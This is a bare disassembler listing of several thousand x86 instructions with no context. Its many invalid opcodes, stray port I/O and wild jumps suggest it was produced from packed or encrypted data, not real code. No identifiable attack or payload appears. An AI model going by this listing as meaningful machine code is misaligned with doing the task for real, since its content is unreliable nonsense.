  449a31:	xchg   ecx,eax
  449a32:	push   esi
  449a33:	repnz adc eax,0xede64e83
  449a39:	adc    ebp,DWORD PTR [edi-0x2]
  449a3c:	sbb    BYTE PTR [ecx+0xdc8c33e],cl
  449a42:	xchg   ecx,eax
  449a43:	jle    0x4499f4
  449a45:	lahf   
  449a46:	fwait
  449a47:	cmp    DWORD PTR [esi+0x7f5ed303],edx
  449a4d:	xchg   esi,eax
  449a4e:	mov    ds:0xce055a34,eax
  449a53:	in     al,0x88
  449a55:	push   esp
  449a56:	(bad)  
  449a58:	push   0x7527b311
  449a5d:	or     DWORD PTR [esi],eax
  449a5f:	repz and dl,0x52
  449a63:	xor    eax,0x15cea921
  449a68:	pop    esp
  449a69:	(bad)  
  449a6a:	jl     0x449ac8
  449a6c:	xor    bl,al
  449a6e:	jl     0x4499f8
  449a70:	rcr    DWORD PTR [edi+0xba3fb],cl
  449a76:	push   edx
  449a77:	pop    ebx
  449a78:	and    ecx,ecx
  449a7a:	lahf   
  449a7b:	push   eax
  449a7c:	stos   BYTE PTR es:[edi],al
  449a7d:	jg     0x449af0
  449a7f:	add    bh,BYTE PTR [ebp-0x80]
  449a82:	in     al,dx
  449a83:	and    bh,BYTE PTR [ecx]
  449a85:	out    0x67,eax
  449a87:	imul   esp,ebx,0x3c6ebc4f
  449a8d:	mov    eax,0xc045f7d5
  449a92:	lods   al,BYTE PTR ds:[esi]
  449a93:	(bad)  
  449a94:	out    0x2a,al
  449a96:	mov    esi,0x4b9e6bb4
  449a9b:	out    dx,al
  449a9c:	ficom  DWORD PTR [ebx]
  449a9e:	xchg   edx,edx
  449aa0:	int    0x7f
  449aa2:	dec    edx
  449aa3:	retf   0x5323
  449aa6:	enter  0xef84,0x23
  449aaa:	push   edi
  449aab:	pop    edi
  449aac:	push   ecx
  449aad:	in     eax,0xbb
  449aaf:	add    esp,edi
  449ab1:	pushf  
  449ab2:	xchg   BYTE PTR [edx-0xd1ea003],dl
  449ab8:	add    BYTE PTR [edx+ecx*1+0x3e],cl
  449abc:	push   ss
  449abd:	leave  
  449abe:	and    eax,0x2833a6ba
  449ac3:	jno    0x449a8b
  449ac5:	int3   
  449ac6:	into   
  449ac7:	sbb    BYTE PTR [ebp-0x46],cl
  449aca:	ins    BYTE PTR es:[edi],dx
  449acb:	ror    DWORD PTR [ebx+0x32],0x37
  449acf:	sub    eax,0xf4bb48ae
  449ad4:	sbb    edx,DWORD PTR [ebx-0x61]
  449ad7:	mov    dh,0x86
  449ad9:	aad    0x90
  449adb:	aam    0x16
  449add:	ja     0x449b55
  449adf:	fsubr  st,st(5)
  449ae1:	push   eax
  449ae2:	test   al,0xcb
  449ae4:	lahf   
  449ae5:	xor    DWORD PTR [edx+0x35991534],edi
  449aeb:	jnp    0x449af3
  449aed:	ja     0x449b60
  449aef:	sbb    ebp,DWORD PTR ds:0xa8852570
  449af5:	sbb    eax,0x39a803c
  449afa:	mov    ah,0x4
  449afc:	inc    esp
  449afd:	dec    ebx
  449afe:	shr    DWORD PTR [ebp-0x4b],1
  449b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449b02:	cwde   
  449b03:	repnz mov esi,DWORD PTR [eax]
  449b06:	adc    eax,0x6810ce42
  449b0b:	xchg   ecx,eax
  449b0c:	jge    0x449a99
  449b0e:	mov    bh,0x24
  449b10:	aaa    
  449b11:	mov    ecx,0x32e5eb61
  449b16:	add    esi,DWORD PTR [ecx]
  449b18:	(bad)
  449b1b:	cld    
  449b1c:	out    0xb9,eax
  449b1e:	sar    BYTE PTR [ecx+0x73],cl
  449b21:	or     esi,ebp
  449b23:	scas   eax,DWORD PTR es:[edi]
  449b24:	mov    esi,0x76d4b7f5
  449b29:	jmp    0x449aba
  449b2b:	mov    WORD PTR [eax+0x59],?
  449b2e:	push   edi
  449b2f:	iret   
  449b30:	stc    
  449b31:	and    DWORD PTR ds:0x1713186e,ebp
  449b37:	loop   0x449adb
  449b39:	fwait
  449b3a:	popf   
  449b3b:	cmp    al,0xcb
  449b3d:	cmp    DWORD PTR [ebp-0xb9d56ac],0xffffffcc
  449b44:	pop    ss
  449b45:	lock lods eax,DWORD PTR ds:[esi]
  449b47:	sar    ecx,1
  449b49:	pcmpeqb mm6,mm1
  449b4c:	out    dx,eax
  449b4d:	aaa    
  449b4e:	pop    ds
  449b4f:	xchg   ecx,eax
  449b50:	loop   0x449b0b
  449b52:	mov    esp,0xd43fae54
  449b57:	in     al,0x56
  449b59:	jb     0x449b9b
  449b5b:	push   edi
  449b5c:	cmp    ebp,DWORD PTR [eax+0x15e45801]
  449b62:	adc    edx,DWORD PTR [eax-0x7b450103]
  449b68:	mov    esi,0x35cc7a59
  449b6d:	mov    cl,BYTE PTR [edi+eiz*8-0x592bd578]
  449b74:	sbb    bh,BYTE PTR [ecx+0x3a]
  449b77:	sbb    eax,0x384c1bd
  449b7c:	sbb    al,0xa8
  449b7e:	or     edi,DWORD PTR [ecx+ebp*4-0x7a]
  449b82:	gs pusha 
  449b84:	mov    al,0xe5
  449b86:	pop    edi
  449b87:	sbb    ah,BYTE PTR [edx-0x4bc7a45c]
  449b8d:	(bad)  
  449b8e:	mov    ebx,0xdd063570
  449b93:	or     eax,0xf4164cbe
  449b98:	out    dx,eax
  449b99:	jo     0x449bbb
  449b9b:	adc    eax,0xb927a502
  449ba0:	fsubr  st(0),st
  449ba2:	inc    esp
  449ba3:	cli    
  449ba4:	xchg   esi,eax
  449ba5:	cmp    eax,0x4f43e2ee
  449baa:	inc    ebx
  449bab:	ins    DWORD PTR es:[edi],dx
  449bac:	and    edi,edi
  449bae:	jno    0x449bab
  449bb0:	and    al,0x79
  449bb2:	addr16 ret 0x8c8a
  449bb6:	xchg   ebx,eax
  449bb7:	xor    DWORD PTR [ebx-0x5a],ebx
  449bba:	mov    ebx,0x12a71ea3
  449bbf:	fbstp  TBYTE PTR [edi+eiz*8+0x5c904dd]
  449bc6:	shl    BYTE PTR [eax+eiz*8+0x67e211a5],1
  449bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449bce:	dec    ebx
  449bcf:	pop    esp
  449bd0:	jl     0x449b87
  449bd2:	or     esp,ebp
  449bd4:	dec    edx
  449bd5:	inc    ebp
  449bd6:	aas    
  449bd7:	aam    0x76
  449bd9:	xchg   edx,eax
  449bda:	in     eax,0x14
  449bdc:	pop    ebp
  449bdd:	mov    ds:0xee98265,eax
  449be2:	cld    
  449be3:	test   BYTE PTR [esi-0x7dcf689b],0xe8
  449bea:	ja     0x449bdf
  449bec:	adc    eax,0xfda218db
  449bf1:	add    eax,0x90f7d8b1
  449bf6:	iret   
  449bf7:	repnz sub eax,DWORD PTR [ebp-0x653a82a3]
  449bfe:	xchg   ebx,eax
  449bff:	inc    ebx
  449c00:	cmp    ebp,ebp
  449c02:	pop    eax
  449c03:	xchg   ebp,eax
  449c04:	idiv   BYTE PTR [ecx]
  449c06:	mov    edx,0xcfa7b2c2
  449c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449c0c:	mov    eax,ds:0xa5f462e5
  449c11:	outs   dx,BYTE PTR ds:[esi]
  449c12:	and    bl,ch
  449c14:	fmul   QWORD PTR [edi+0x29]
  449c17:	jle    0x449c38
  449c19:	mov    ecx,edi
  449c1b:	xor    al,0xcd
  449c1d:	into   
  449c1e:	push   ds
  449c1f:	pop    edx
  449c20:	push   edx
  449c21:	test   eax,0x60f07c5b
  449c26:	xor    eax,0xdb276084
  449c2b:	(bad)  
  449c2c:	sbb    ecx,ebx
  449c2e:	aaa    
  449c2f:	mov    eax,0x8feca544
  449c34:	or     DWORD PTR ss:[esi+eax*2-0x1e],ebx
  449c39:	stc    
  449c3a:	sub    esp,eax
  449c3c:	rol    BYTE PTR ds:0x91aeabf,1
  449c42:	sbb    ch,cl
  449c44:	xor    ebx,ecx
  449c46:	cmp    esi,DWORD PTR [eax]
  449c48:	in     eax,0xa3
  449c4a:	retf   
  449c4b:	jg     0x449bd9
  449c4d:	xchg   ebx,eax
  449c4e:	inc    edx
  449c4f:	push   0x7f507270
  449c54:	or     al,0xe4
  449c56:	mov    dh,0x14
  449c58:	jns    0x449c0c
  449c5a:	cmp    dl,BYTE PTR [ebx+0x5]
  449c5d:	inc    edi
  449c5e:	jg     0x449c50
  449c60:	mov    ds:0x4be2656,al
  449c65:	stos   BYTE PTR es:[edi],al
  449c66:	pop    ss
  449c67:	ss mov dl,0xa4
  449c6a:	aas    
  449c6b:	xor    eax,0xdb244c46
  449c70:	and    eax,0xc3ec0532
  449c75:	push   eax
  449c76:	mov    eax,gs
  449c78:	out    dx,al
  449c79:	nop
  449c7a:	cwde   
  449c7b:	fstp   TBYTE PTR [ebp+0x5b]
  449c7e:	in     eax,dx
  449c7f:	hlt    
  449c80:	inc    edi
  449c81:	fcomp  DWORD PTR es:[edi-0x70f4496f]
  449c88:	sub    al,0x1f
  449c8a:	outs   dx,DWORD PTR ds:[esi]
  449c8b:	pusha  
  449c8c:	sub    esi,DWORD PTR [edx+0x78]
  449c8f:	or     al,BYTE PTR [edx+ecx*2-0x28]
  449c93:	out    0xd,eax
  449c95:	sub    eax,0xb1d204b7
  449c9a:	rol    BYTE PTR [eax-0x4b],cl
  449c9d:	push   esi
  449c9e:	push   edx
  449c9f:	in     eax,0x2c
  449ca1:	mov    ?,esi
  449ca3:	jae    0x449cc8
  449ca5:	cdq    
  449ca6:	jle    0x449c97
  449ca8:	jb     0x449d03
  449caa:	icebp  
  449cab:	fidivr DWORD PTR [ecx+0x13]
  449cae:	cs stc 
  449cb0:	pusha  
  449cb1:	inc    BYTE PTR [edx+0x5e]
  449cb4:	retf   0xa5f
  449cb7:	jne    0x449cc7
  449cb9:	lds    edi,FWORD PTR [edx-0x8966a70]
  449cbf:	call   0xede698fb
  449cc4:	and    DWORD PTR [ecx],ebx
  449cc6:	cwde   
  449cc7:	rol    dh,cl
  449cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449cca:	pop    ds
  449ccb:	push   eax
  449ccc:	xchg   esp,eax
  449ccd:	fistp  QWORD PTR [ebx+0x1ce4a38b]
  449cd3:	xor    al,0x21
  449cd5:	test   eax,0x3f3957b
  449cda:	fs add eax,0xee0223f5
  449ce0:	nop
  449ce1:	call   0x69629d99
  449ce6:	inc    edi
  449ce7:	mov    edx,0x23ec1db7
  449cec:	rcr    BYTE PTR [edi+0x2f0f8ccb],0xe5
  449cf3:	xchg   esi,eax
  449cf4:	push   edi
  449cf5:	xchg   edi,eax
  449cf6:	mov    DWORD PTR [esi+0x74b06428],edi
  449cfc:	dec    ecx
  449cfd:	xor    al,BYTE PTR [esi]
  449cff:	js     0x449d56
  449d01:	or     al,0xcc
  449d03:	in     eax,0xab
  449d05:	test   eax,0x89512e52
  449d0a:	scas   eax,DWORD PTR es:[edi]
  449d0b:	and    BYTE PTR [edi],bl
  449d0d:	into   
  449d0e:	int3   
  449d0f:	sahf   
  449d10:	outs   dx,BYTE PTR ds:[esi]
  449d11:	stos   BYTE PTR es:[edi],al
  449d12:	leave  
  449d13:	and    bl,BYTE PTR [ebx-0x2a9c705b]
  449d19:	mov    fs,WORD PTR [ebx]
  449d1b:	out    dx,al
  449d1c:	xor    dh,BYTE PTR [ebx+edx*4+0x2aa91fce]
  449d23:	jmp    0x449d0b
  449d25:	shr    ebp,1
  449d27:	sahf   
  449d28:	out    dx,al
  449d29:	test   eax,0x9f66dd99
  449d2e:	jnp    0x449cc3
  449d30:	push   edi
  449d31:	or     DWORD PTR [edx],ebp
  449d33:	inc    ebp
  449d34:	pop    ecx
  449d35:	mov    ebp,0xfe47067f
  449d3a:	mov    esi,0x8507a554
  449d3f:	adc    BYTE PTR [ebp+0x4ef0998f],dh
  449d45:	dec    edi
  449d46:	mov    bh,0xa6
  449d48:	and    eax,0x5f03f609
  449d4d:	repz rcl DWORD PTR [edi+0x733beaf9],cl
  449d54:	adc    eax,0xa6a927de
  449d59:	jae    0x449d78
  449d5b:	add    BYTE PTR [eax+eiz*2-0x56e1ea18],ch
  449d62:	mov    ds:0x9b73dd2d,eax
  449d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449d68:	rol    DWORD PTR [edx+0x2b9fba3c],0xa6
  449d6f:	data16 sub al,0x37
  449d72:	mov    dl,0x14
  449d74:	sbb    al,0xb9
  449d76:	scas   al,BYTE PTR es:[edi]
  449d77:	mov    ah,0x34
  449d79:	xchg   ebx,eax
  449d7a:	rcr    BYTE PTR [edi-0x173093fe],0x1c
  449d81:	or     DWORD PTR [ebp-0x7b7858b0],edx
  449d87:	shl    BYTE PTR [ecx+ebp*8],1
  449d8a:	mov    esi,0xf2ff3229
  449d8f:	shr    edx,0x9b
  449d92:	sbb    eax,DWORD PTR [edi+0x1174c4b6]
  449d98:	mov    esi,0x7412d509
  449d9d:	xchg   esi,eax
  449d9e:	mov    ebx,0x8fb81014
  449da3:	xchg   di,ax
  449da5:	(bad)  
  449da6:	(bad)  
  449da7:	retf   0xd3d5
  449daa:	outs   dx,DWORD PTR ds:[esi]
  449dab:	out    dx,al
  449dac:	add    bl,0x17
  449daf:	in     eax,0x18
  449db1:	cmp    DWORD PTR [ebx+eax*1-0x35],edx
  449db5:	fisubr WORD PTR [ecx+0x1c13ea4f]
  449dbb:	pop    ebp
  449dbc:	fidiv  DWORD PTR gs:[edi+0xa]
  449dc0:	ret    0xccd4
  449dc3:	out    0xf9,eax
  449dc5:	pushf  
  449dc6:	hlt    
  449dc7:	(bad)  
  449dc8:	fisttp QWORD PTR [edx+edi*4-0x1ef87811]
  449dcf:	mov    ds:0xeb5162b5,al
  449dd4:	xor    eax,0xdf08131f
  449dd9:	pop    esp
  449dda:	xor    eax,0x7fe13d0f
  449ddf:	in     al,dx
  449de0:	mov    eax,ds:0x66919e16
  449de5:	jecxz  0x449d94
  449de7:	fs fwait
  449de9:	mov    eax,ds:0xb7ea9e29
  449dee:	mov    ecx,0xb901c0af
  449df3:	push   esp
  449df4:	test   DWORD PTR [eax+0x4f],0xea5cd599
  449dfb:	repnz mov eax,ds:0x417510fe
  449e01:	sub    BYTE PTR [ebp+0x40],dh
  449e04:	pop    esi
  449e05:	xchg   DWORD PTR [edi-0x2b21c01c],esi
  449e0b:	xor    DWORD PTR [ebp-0x371775ce],0x1ffa5cd4
  449e15:	sbb    DWORD PTR [ebp-0x13b19ba6],ecx
  449e1b:	lods   al,BYTE PTR ds:[esi]
  449e1c:	dec    ebp
  449e1d:	dec    bp
  449e1f:	popf   
  449e20:	cld    
  449e21:	popf   
  449e22:	(bad)  
  449e23:	bound  esi,QWORD PTR [ecx+0x4a904fd8]
  449e29:	sbb    al,BYTE PTR [eax-0x2b]
  449e2c:	mov    edx,0x47ac2ba7
  449e31:	stc    
  449e32:	add    eax,ebx
  449e34:	lods   eax,DWORD PTR ds:[esi]
  449e35:	ror    BYTE PTR [edx+0xd41d3f],1
  449e3b:	and    eax,0xc5732524
  449e40:	mov    ebx,0x39885ba4
  449e45:	lock dec edx
  449e47:	cmp    BYTE PTR [edi-0x6c28bc06],0x45
  449e4e:	pusha  
  449e4f:	add    eax,0x2e80626
  449e54:	pop    ecx
  449e55:	cmp    BYTE PTR [ecx+0x6a9b642],bl
  449e5b:	ficom  DWORD PTR [ecx+edx*1-0x1051a1d1]
  449e62:	mov    ds:0xd9925ea,al
  449e67:	adc    edi,DWORD PTR [edx+0x42]
  449e6a:	xor    al,0xe
  449e6c:	mov    dl,0x9e
  449e6e:	jmp    0x449e39
  449e70:	push   ss
  449e71:	adc    eax,0xa9e67008
  449e76:	je     0x449e59
  449e78:	repnz or eax,0xe187e4b1
  449e7e:	aaa    
  449e7f:	aas    
  449e80:	mov    dh,0x8f
  449e82:	(bad)  
  449e84:	and    DWORD PTR [edi],edx
  449e86:	xlat   BYTE PTR ds:[ebx]
  449e87:	dec    ebp
  449e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449e89:	mov    bh,0x84
  449e8b:	push   edx
  449e8c:	jmp    0xfd695419
  449e91:	cmp    al,0x24
  449e93:	and    al,BYTE PTR [ebp+0x3553129c]
  449e99:	les    ebp,FWORD PTR [edx-0x17]
  449e9c:	scas   al,BYTE PTR es:[edi]
  449e9d:	add    eax,0xacad8213
  449ea2:	lahf   
  449ea3:	ja     0x449efa
  449ea5:	or     DWORD PTR [ebx-0x10],edx
  449ea8:	adc    edx,esi
  449eaa:	sbb    DWORD PTR [ebx-0x43],esi
  449ead:	cdq    
  449eae:	sti    
  449eaf:	and    bh,al
  449eb1:	mov    WORD PTR [edx-0x2b28eb66],gs
  449eb7:	mov    ah,0xb2
  449eb9:	sub    DWORD PTR [ecx-0xad873fc],edi
  449ebf:	mul    ch
  449ec1:	nop
  449ec2:	aam    0xf2
  449ec4:	pop    edx
  449ec5:	mov    es,edi
  449ec7:	cli    
  449ec8:	and    BYTE PTR [ecx],cl
  449eca:	loop   0x449f32
  449ecc:	sbb    eax,0xd6218174
  449ed1:	adc    bh,BYTE PTR [esp+ebp*8]
  449ed4:	sbb    al,0x7f
  449ed6:	mov    esi,0xb4cb258d
  449edb:	shr    DWORD PTR [esi+0x66],1
  449ede:	mov    ds,WORD PTR [eax-0x59]
  449ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449ee2:	mov    ebp,0x5b4e5284
  449ee7:	aam    0x7
  449ee9:	loopne 0x449ef8
  449eeb:	fld    DWORD PTR [ecx]
  449eed:	sub    esp,DWORD PTR [ebx-0x12]
  449ef0:	out    dx,al
  449ef1:	pop    ebp
  449ef2:	fdivr  QWORD PTR [edx]
  449ef4:	cmp    al,0x6b
  449ef6:	mov    edx,0xd8c2bb54
  449efb:	add    BYTE PTR [ebp-0x6118978a],0x8a
  449f02:	(bad)  
  449f03:	call   0xc98f:0x3e33ea0b
  449f0a:	lea    edx,[eax+0x77]
  449f0d:	or     eax,0x884b998a
  449f12:	mov    bh,0x5f
  449f14:	sub    eax,0x9e737d60
  449f19:	mov    ds:0x92862783,eax
  449f1e:	imul   ecx,DWORD PTR [ecx-0x1d],0xf5eeeade
  449f25:	shr    BYTE PTR [ecx+ebp*8-0x55ccfcfb],0x5f
  449f2d:	test   al,0x9b
  449f2f:	outs   dx,DWORD PTR ds:[esi]
  449f30:	dec    ecx
  449f31:	xchg   esp,eax
  449f32:	les    eax,FWORD PTR [edx]
  449f34:	(bad)  
  449f35:	cld    
  449f36:	mov    al,0x4e
  449f38:	sub    bl,BYTE PTR [edi-0x4c]
  449f3b:	xor    al,0xc8
  449f3d:	loop   0x449f77
  449f3f:	inc    eax
  449f40:	gs mov es,ebx
  449f43:	jmp    0xf600be4d
  449f48:	(bad)
  449f4c:	pop    esi
  449f4d:	das    
  449f4e:	or     al,0xe5
  449f50:	inc    ebx
  449f51:	dec    esi
  449f52:	mov    esi,0x8d4d5fe
  449f57:	out    0xeb,eax
  449f59:	mov    bl,BYTE PTR [ecx]
  449f5b:	xchg   esi,eax
  449f5c:	jbe    0x449f99
  449f5e:	mov    bh,0xde
  449f60:	fimul  DWORD PTR [edx+0x8]
  449f63:	xchg   edx,eax
  449f64:	fisub  DWORD PTR [eax-0x6e25f975]
  449f6a:	ja     0x449f33
  449f6c:	xchg   ecx,eax
  449f6d:	sahf   
  449f6e:	retf   
  449f6f:	pop    ebp
  449f70:	data16 out 0x23,al
  449f73:	aad    0x59
  449f75:	loop   0x449f90
  449f77:	xor    esp,ecx
  449f79:	clc    
  449f7a:	into   
  449f7b:	hlt    
  449f7c:	or     dl,BYTE PTR [edi]
  449f7e:	sbb    ah,bh
  449f80:	add    DWORD PTR [esi-0x10],ebx
  449f83:	inc    edx
  449f84:	and    cl,cl
  449f86:	pop    edi
  449f87:	sub    BYTE PTR [edi+eax*1+0x77],ah
  449f8b:	fist   WORD PTR [esi+0x569fa132]
  449f91:	pushf  
  449f92:	jae    0x449ffc
  449f94:	cmp    edx,DWORD PTR [bp+di+0x2f35]
  449f99:	lahf   
  449f9a:	mov    edx,DWORD PTR ds:0xf4a71d09
  449fa0:	dec    esi
  449fa1:	jl     0x449fa6
  449fa3:	lahf   
  449fa4:	push   eax
  449fa5:	sub    eax,0xae8f64b2
  449faa:	pop    eax
  449fab:	nop
  449fac:	jne    0x449fee
  449fae:	ins    DWORD PTR es:[edi],dx
  449faf:	icebp  
  449fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449fb1:	data16 mov ah,0x97
  449fb4:	lds    edx,FWORD PTR [eax]
  449fb6:	jg     0x449f42
  449fb8:	push   esp
  449fb9:	mov    ds:0xb41d4524,al
  449fbe:	mov    bh,0x82
  449fc0:	mov    BYTE PTR [edx-0x34],bh
  449fc3:	push   0xcf7d8983
  449fc8:	jl     0x449ffc
  449fca:	mov    dl,0x2e
  449fcc:	pop    ss
  449fcd:	jns    0x449f6a
  449fcf:	std    
  449fd0:	push   cs
  449fd1:	aas    
  449fd2:	repnz push edi
  449fd4:	les    esp,FWORD PTR [edx+0x73]
  449fd7:	ret    
  449fd8:	in     eax,0x90
  449fda:	mov    ebx,0xde9ccfe6
  449fdf:	and    DWORD PTR [eax],0x29
  449fe2:	mov    edi,0x10b47258
  449fe7:	(bad)  
  449fe8:	mov    BYTE PTR [edx+0x62dcdadb],ah
  449fee:	dec    ecx
  449fef:	leave  
  449ff0:	cmp    BYTE PTR [ecx-0x5c],0x52
  449ff4:	fmul   QWORD PTR [ebx+esi*4+0x74]
  449ff8:	retfw  
  449ffa:	push   esp
  449ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449ffc:	aam    0xa3
  449ffe:	or     DWORD PTR [ebp+eax*4+0x17],esi
  44a002:	inc    ebp
  44a003:	in     eax,dx
  44a004:	and    al,0x93
  44a006:	push   ss
  44a007:	sbb    eax,0x73aed91d
  44a00c:	test   DWORD PTR [ecx],edi
  44a00e:	(bad)  
  44a00f:	cld    
  44a010:	pop    esp
  44a011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a012:	or     ebp,ebp
  44a014:	sahf   
  44a015:	outs   dx,BYTE PTR ds:[esi]
  44a016:	and    ebx,0xffffffbb
  44a019:	jns    0x449ff0
  44a01b:	jl     0x44a055
  44a01d:	push   esp
  44a01e:	mov    ah,0x4
  44a020:	push   0xc
  44a022:	push   edi
  44a023:	cmp    al,0x7a
  44a025:	add    BYTE PTR [ebp-0x436f3092],0x14
  44a02c:	fild   QWORD PTR [eax*2-0x40b06c7b]
  44a033:	add    al,0x2b
  44a035:	div    bh
  44a037:	je     0x44a01e
  44a039:	pusha  
  44a03a:	xchg   ecx,eax
  44a03b:	icebp  
  44a03c:	ds sbb eax,0xf9173311
  44a042:	outs   dx,DWORD PTR ds:[esi]
  44a043:	in     eax,dx
  44a044:	fldlg2 
  44a046:	in     eax,dx
  44a047:	in     al,0x7e
  44a049:	xchg   esp,eax
  44a04a:	ret    
  44a04b:	cli    
  44a04c:	mov    dh,0xae
  44a04e:	data16 adc al,0xee
  44a051:	xchg   ecx,eax
  44a052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a053:	loop   0x449feb
  44a055:	mov    bh,0x32
  44a057:	fs hlt 
  44a059:	inc    ebx
  44a05a:	mov    ecx,0x79a36124
  44a05f:	inc    edi
  44a060:	xor    eax,0xbf341a2
  44a065:	in     eax,dx
  44a066:	sbb    eax,edi
  44a068:	sbb    edi,DWORD PTR [ecx]
  44a06a:	stos   DWORD PTR es:[edi],eax
  44a06b:	es mov al,0x72
  44a06e:	mov    ebx,0x72dfc2c3
  44a073:	or     BYTE PTR [ebx+eiz*4],dh
  44a076:	or     ebp,DWORD PTR [ebp+0x59cd9c82]
  44a07c:	dec    ecx
  44a07d:	add    eax,0x69cdf779
  44a082:	mov    cl,0x64
  44a084:	call   0xa293:0x25bf9465
  44a08b:	out    dx,al
  44a08c:	shl    esi,1
  44a08e:	push   0xffffffe6
  44a090:	adc    eax,0x52fce099
  44a095:	jb     0x44a0aa
  44a097:	sub    esp,eax
  44a099:	jge    0x44a0f7
  44a09b:	lods   al,BYTE PTR ds:[esi]
  44a09c:	cmc    
  44a09d:	adc    esp,0x79a7d4e
  44a0a3:	scas   eax,DWORD PTR es:[edi]
  44a0a4:	adc    al,0x30
  44a0a6:	sti    
  44a0a7:	xor    al,0x9
  44a0a9:	xchg   edi,eax
  44a0aa:	mov    ch,0xc4
  44a0ac:	or     BYTE PTR [ebp-0x2f],0x97
  44a0b0:	test   DWORD PTR [ebx-0x5d913be],ebx
  44a0b6:	cli    
  44a0b7:	or     al,0x1d
  44a0b9:	sub    DWORD PTR [eax+ebp*8+0xd],ecx
  44a0bd:	gs std 
  44a0bf:	test   BYTE PTR [eax-0x77],bh
  44a0c2:	cmp    al,0xdc
  44a0c4:	ja     0x44a102
  44a0c6:	and    DWORD PTR [esp+edx*2-0x18],edx
  44a0ca:	mov    edi,0x38a99582
  44a0cf:	loop   0x44a144
  44a0d1:	popf   
  44a0d2:	aad    0x29
  44a0d4:	dec    ebx
  44a0d5:	xchg   ebp,eax
  44a0d6:	mov    dl,0x46
  44a0d8:	pop    ebp
  44a0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a0da:	push   ds
  44a0db:	mov    ds:0x202defc1,eax
  44a0e0:	and    al,0x99
  44a0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a0e3:	xlat   BYTE PTR ds:[ebx]
  44a0e4:	jne    0x44a0cc
  44a0e6:	mov    ecx,0xaba64a0b
  44a0eb:	das    
  44a0ec:	jmp    0x44a0a0
  44a0ee:	mov    bl,bh
  44a0f0:	lods   eax,DWORD PTR ds:[esi]
  44a0f1:	jmp    0x44a119
  44a0f3:	fs ss xchg esi,eax
  44a0f6:	mov    ebx,0xeaed7324
  44a0fb:	addr16 test al,0x82
  44a0fe:	je     0x44a0d3
  44a100:	inc    ebp
  44a101:	mov    BYTE PTR [ebp-0xf],ah
  44a104:	outs   dx,BYTE PTR ds:[esi]
  44a105:	sub    ebp,DWORD PTR fs:0x94b95b4e
  44a10c:	inc    eax
  44a10d:	ror    DWORD PTR [esi+0x43],cl
  44a110:	mov    ch,0x74
  44a112:	stc    
  44a113:	lock fwait
  44a115:	jge    0x44a11b
  44a117:	push   ecx
  44a118:	inc    edi
  44a119:	stc    
  44a11a:	jmp    0x44a0f9
  44a11c:	sbb    ch,BYTE PTR [ebx]
  44a11e:	not    DWORD PTR [ebx+0x4f]
  44a121:	and    eax,0xa6cfa4a9
  44a126:	sti    
  44a127:	out    dx,eax
  44a128:	inc    edx
  44a129:	jp     0x44a0c8
  44a12b:	mov    eax,0xb08fdecb
  44a130:	hlt    
  44a131:	inc    esi
  44a132:	mov    ch,0xf4
  44a134:	mov    bl,0xd9
  44a136:	pop    ss
  44a137:	and    eax,0x20417d66
  44a13c:	inc    eax
  44a13d:	(bad)  
  44a13f:	mov    ecx,0x5349dca4
  44a144:	sbb    DWORD PTR [ecx],edi
  44a146:	(bad)  
  44a147:	jmp    0x44a1ae
  44a149:	jne    0x44a11e
  44a14b:	arpl   ax,dx
  44a14d:	mov    ds:0x6c2a238b,al
  44a152:	daa    
  44a153:	mov    BYTE PTR [edx-0x380deb08],bl
  44a159:	push   edi
  44a15a:	mov    esi,0x73a62954
  44a15f:	adc    al,BYTE PTR [ebp+0x2a]
  44a162:	mov    esp,0x79fe03f1
  44a167:	repz sahf 
  44a169:	outs   dx,BYTE PTR ds:[esi]
  44a16a:	mov    ah,0x85
  44a16d:	cdq    
  44a16e:	push   ss
  44a16f:	in     al,dx
  44a170:	xchg   esi,eax
  44a171:	call   0xdc03:0x7f06c7e2
  44a178:	sti    
  44a179:	and    eax,0x117f75f
  44a17e:	popf   
  44a17f:	daa    
  44a180:	shl    DWORD PTR [edx+0x63],0x83
  44a184:	adc    al,0xb4
  44a186:	mov    eax,0xc5b135f4
  44a18b:	ss add eax,0x5f3e99c
  44a191:	jmp    0xbdbf:0x4ffaa55d
  44a198:	dec    ebp
  44a199:	jl     0x44a211
  44a19b:	lock mul BYTE PTR [eax-0x34ae4655]
  44a1a2:	mov    BYTE PTR [ebp-0x39],bh
  44a1a5:	inc    ecx
  44a1a6:	(bad)  
  44a1a7:	repz jge 0x44a227
  44a1aa:	sahf   
  44a1ab:	adc    eax,0x73613225
  44a1b0:	mov    ch,0xe6
  44a1b2:	xor    al,0xe9
  44a1b4:	push   es
  44a1b5:	push   eax
  44a1b6:	arpl   di,sp
  44a1b8:	push   edx
  44a1b9:	sub    DWORD PTR [ecx],edi
  44a1bb:	sub    eax,0xe099c89
  44a1c0:	in     al,0x8a
  44a1c2:	shl    DWORD PTR [edx+0x25],1
  44a1c5:	dec    esp
  44a1c6:	inc    esp
  44a1c7:	in     al,dx
  44a1c8:	ins    DWORD PTR es:[edi],dx
  44a1c9:	mov    dh,0xfd
  44a1cb:	fistp  DWORD PTR [esi]
  44a1cd:	stc    
  44a1ce:	(bad)  
  44a1cf:	(bad)  
  44a1d0:	enter  0xe277,0x43
  44a1d4:	jge    0x44a175
  44a1d6:	cmp    esi,DWORD PTR [edi-0x224c77da]
  44a1dc:	cmp    DWORD PTR [ecx],esp
  44a1de:	xchg   esp,eax
  44a1df:	fist   DWORD PTR [esi]
  44a1e1:	lods   eax,DWORD PTR ds:[esi]
  44a1e2:	jmp    0x44a178
  44a1e4:	fwait
  44a1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a1e6:	inc    esi
  44a1e7:	mov    ah,0xe8
  44a1e9:	fwait
  44a1ea:	jmp    0x44a221
  44a1ec:	sub    eax,0xda0d4de5
  44a1f1:	add    edx,esp
